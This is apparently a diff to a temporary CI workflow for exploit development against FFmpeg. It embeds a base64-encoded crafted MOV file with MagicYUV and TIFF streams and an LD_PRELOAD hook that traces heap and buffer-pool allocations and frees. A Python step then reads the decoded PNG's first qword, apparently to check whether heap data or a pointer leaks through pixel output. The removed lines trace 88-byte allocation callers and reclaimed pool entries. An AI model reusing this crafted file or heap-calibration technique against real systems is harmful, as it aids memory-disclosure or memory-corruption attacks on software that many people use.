@@ -1,4 +1,4 @@
-name: Temporary exact sameinv allocation caller calibration
+name: Temporary FFmpeg safe heap calibration
 on:
   push:
     branches:
@@ -9,94 +9,103 @@ jobs:
   calibrate:
     runs-on: ubuntu-24.04
     steps:
-      - name: Identify intervening 88-byte allocation caller
+      - name: Reproduce benign MagicYUV TIFF carrier
         shell: bash
         run: |
           set -euo pipefail
           sudo apt-get update -qq
-          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ffmpeg libavutil-dev gcc libc6-dbg
-          cat >/tmp/sameinv.b64 <<'B64'
-          AAAAFGZ0eXBxdCAgAAACAHF0ICAAAAAId2lkZQAABNNtZGF0TUFHWSAAAAAHaQwAAAAgAAgAAAAIAAAACAAAAAIAAABBAwAAQQMAAF0DAAB5AwAAlQMAAE0DAABpAwAAhQMAAKEDAABVAwAAcQMAAI0DAACpAwAAAwADBgkBBAcKAgUICwQICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAcICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkGCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgHCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQkJCQkJCQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJBggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQkJCQkJCQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIBwgICAgICAgICAgICAgI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
-          B64
-          base64 -d /tmp/sameinv.b64 >/tmp/sameinv.mov
+          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ffmpeg build-essential python3
+          cat > /tmp/sameinv.b64 <<'B64'
+AAAAFGZ0eXBxdCAgAAACAHF0ICAAAAAId2lkZQAABFttZGF0TUFHWSAAAAAHaQwAAAAgAAgAAAAIAAAACAAAAAIAAABBAwAAQQMAAF0DAAB5AwAAlQMAAE0DAABpAwAAhQMAAKEDAABVAwAAcQMAAI0DAACpAwAAAwADBgkBBAcKAgUICwQICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAcICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkGCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgHCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQkJCQkJCQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJBggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQkJCQkJCQgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIBwgICAgICAgICAgICAg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
+B64
+          base64 -d /tmp/sameinv.b64 > /tmp/sameinv.mov
+          echo '=== versions ==='
+          ffmpeg -version | head -n 5
+          ffprobe -v error -show_streams -of compact /tmp/sameinv.mov || true
 
-          cat >/tmp/hook.c <<'EOF'
-          #define _GNU_SOURCE
-          #include <dlfcn.h>
-          #include <libavutil/buffer.h>
-          #include <stdint.h>
-          #include <stdio.h>
-          #include <stddef.h>
-          #include <malloc.h>
-          #include <unistd.h>
-          #include <stdarg.h>
-          #include <string.h>
-          #include <execinfo.h>
+          cat >/tmp/hook.c <<'C'
+#define _GNU_SOURCE
+#include <dlfcn.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <pthread.h>
+#include <stdatomic.h>
 
-          typedef struct LocalBuffer {
-              uint8_t *data; size_t size; unsigned refcount; unsigned _pad;
-              void (*free_cb)(void*, uint8_t*); void *opaque; int flags; int flags_internal;
-          } LocalBuffer;
-          typedef struct LocalEntry {
-              uint8_t *data; void *opaque; void (*free_cb)(void*, uint8_t*);
-              AVBufferPool *pool; struct LocalEntry *next; LocalBuffer buffer;
-          } LocalEntry;
-          static AVBufferRef *(*real_pool_get)(AVBufferPool *);
-          static int (*real_pm)(void **,size_t,size_t);
-          static void (*real_free)(void *);
-          static __thread int busy;
-          static unsigned long seq;
-          static void *entries[64]; static size_t nentries;
-          static void msg(const char *fmt, ...) {
-              if (busy) return; busy=1;
-              char b[1500]; va_list ap; va_start(ap,fmt);
-              int n=vsnprintf(b,sizeof(b),fmt,ap); va_end(ap);
-              if(n>0) write(2,b,(size_t)(n<(int)sizeof(b)?n:(int)sizeof(b)-1));
-              busy=0;
-          }
-          static int entry_id(void *p){for(size_t i=0;i<nentries;i++)if(entries[i]==p)return (int)i;return -1;}
-          static void bt(const char *tag){
-              if(busy)return; busy=1;
-              void *a[16]; int n=backtrace(a,16);
-              dprintf(2,"%s BACKTRACE n=%d\n",tag,n);
-              backtrace_symbols_fd(a,n,2);
-              busy=0;
-          }
-          AVBufferRef *av_buffer_pool_get(AVBufferPool *pool){
-              if(!real_pool_get) real_pool_get=dlsym(RTLD_NEXT,"av_buffer_pool_get");
-              AVBufferRef *r=real_pool_get(pool);
-              if(r){
-                  LocalBuffer *b=(LocalBuffer*)r->buffer; LocalEntry *e=(LocalEntry*)b->opaque;
-                  if(b->size<4096 && e && nentries<64){
-                      int id=entry_id(e); if(id<0){id=(int)nentries;entries[nentries++]=e;}
-                      msg("S%06lu POOL id=%d size=%zu data=%p entry=%p free=%p orig_free=%p\n",
-                          ++seq,id,b->size,b->data,e,b->free_cb,e->free_cb);
-                  }
-              }
-              return r;
-          }
-          int posix_memalign(void **m,size_t al,size_t sz){
-              if(!real_pm) real_pm=dlsym(RTLD_NEXT,"posix_memalign");
-              int rc=real_pm(m,al,sz);
-              if(!busy && rc==0 && (sz==80 || sz==88)){
-                  int id=entry_id(*m);
-                  msg("S%06lu ALLOC size=%zu ptr=%p usable=%zu entry_id=%d\n",++seq,sz,*m,malloc_usable_size(*m),id);
-                  if(id>=0 || sz==80) bt(id>=0?"RECLAIM_ENTRY":"ALLOC80");
-              }
-              return rc;
-          }
-          void free(void *p){
-              if(!real_free) real_free=dlsym(RTLD_NEXT,"free");
-              if(!p){real_free(p);return;}
-              int id=entry_id(p); size_t u=malloc_usable_size(p);
-              if(!busy && id>=0){
-                  unsigned char *x=p; char hx[193]; int q=0;
-                  for(size_t i=0;i<64;i++)q+=snprintf(hx+q,sizeof(hx)-q,"%02x",x[i]);
-                  msg("S%06lu FREE_ENTRY id=%d ptr=%p first64=%s\n",++seq,id,p,hx);
-              }
-              real_free(p);
-          }
-          EOF
-          gcc -O2 -fPIC -shared /tmp/hook.c -o /tmp/hook.so -ldl -rdynamic $(pkg-config --cflags --libs libavutil)
-          LD_PRELOAD=/tmp/hook.so ffmpeg -threads 1 -loglevel error -ss 0 -i /tmp/sameinv.mov -map 0:1 -frames:v 1 -f rawvideo -pix_fmt gray /tmp/out.raw 2>/tmp/trace.log || true
-          cat /tmp/trace.log
+typedef struct AVBuffer AVBuffer;
+typedef struct AVBufferRef { AVBuffer *buffer; uint8_t *data; size_t size; } AVBufferRef;
+struct AVBuffer {
+    uint8_t *data; size_t size; atomic_uint refcount;
+    void (*free_cb)(void*,uint8_t*); void *opaque; int flags; int flags_internal;
+};
+static __thread int busy;
+static int (*real_posix_memalign)(void **, size_t, size_t);
+static void (*real_free)(void *);
+static AVBufferRef *(*real_pool_get)(void *);
+static void (*real_unref)(AVBufferRef **);
+
+static void init_syms(void){
+  if(!real_posix_memalign) real_posix_memalign=dlsym(RTLD_NEXT,"posix_memalign");
+  if(!real_free) real_free=dlsym(RTLD_NEXT,"free");
+  if(!real_pool_get) real_pool_get=dlsym(RTLD_NEXT,"av_buffer_pool_get");
+  if(!real_unref) real_unref=dlsym(RTLD_NEXT,"av_buffer_unref");
+}
+int posix_memalign(void **p,size_t a,size_t n){
+  init_syms(); int r=real_posix_memalign(p,a,n);
+  if(!busy && r==0 && (n==80 || n==88 || n<2048)){ busy=1; fprintf(stderr,"PMEM n=%zu a=%zu p=%p\n",n,a,*p); busy=0; }
+  return r;
+}
+void free(void *p){
+  init_syms();
+  if(!busy && p){ busy=1; fprintf(stderr,"FREE p=%p\n",p); busy=0; }
+  real_free(p);
+}
+AVBufferRef *av_buffer_pool_get(void *pool){
+  init_syms(); AVBufferRef *r=real_pool_get(pool);
+  if(r && !busy){
+    busy=1;
+    struct AVBuffer *b=(struct AVBuffer*)r->buffer;
+    fprintf(stderr,"POOLGET ref=%p buf=%p data=%p size=%zu free=%p opaque=%p\n",
+      (void*)r,(void*)b,(void*)r->data,r->size,(void*)b->free_cb,b->opaque);
+    busy=0;
+  }
+  return r;
+}
+void av_buffer_unref(AVBufferRef **pr){
+  init_syms();
+  if(pr && *pr && !busy){
+    busy=1;
+    AVBufferRef *r=*pr; struct AVBuffer *b=(struct AVBuffer*)r->buffer;
+    fprintf(stderr,"UNREF ref=%p buf=%p data=%p size=%zu free=%p opaque=%p\n",
+      (void*)r,(void*)b,(void*)r->data,r->size,(void*)b->free_cb,b->opaque);
+    busy=0;
+  }
+  real_unref(pr);
+}
+C
+          gcc -shared -fPIC -O0 -o /tmp/hook.so /tmp/hook.c -ldl -pthread
+
+          echo '=== decode ==='
+          set +e
+          LD_PRELOAD=/tmp/hook.so ffmpeg -hide_banner -loglevel error -ss 0 -i /tmp/sameinv.mov -frames:v 1 -f image2pipe -vcodec png /tmp/out.png 2>/tmp/trace.log
+          rc=$?
+          set -e
+          echo "ffmpeg_rc=$rc"
+          echo '=== png ==='
+          python3 - <<'PY'
+import struct,zlib
+p=open('/tmp/out.png','rb').read()
+print('png_len',len(p), 'sig',p[:8].hex())
+pos=8; dat=b''
+while pos+12<=len(p):
+    n=struct.unpack('>I',p[pos:pos+4])[0]; t=p[pos+4:pos+8]; d=p[pos+8:pos+8+n]
+    if t==b'IHDR': print('IHDR',struct.unpack('>IIBBBBB',d))
+    if t==b'IDAT': dat+=d
+    pos+=12+n
+if dat:
+    raw=zlib.decompress(dat)
+    print('scanline_len',len(raw),'first32',raw[:33].hex())
+    if len(raw)>=9: print('qword0',hex(int.from_bytes(raw[1:9],'little')))
+PY
+          echo '=== pool/allocation trace filtered ==='
+          grep -E 'POOLGET|UNREF|PMEM n=(80|88|5[0-9][0-9]|10[0-9][0-9]|11[0-9][0-9])' /tmp/trace.log | tail -n 300 || true
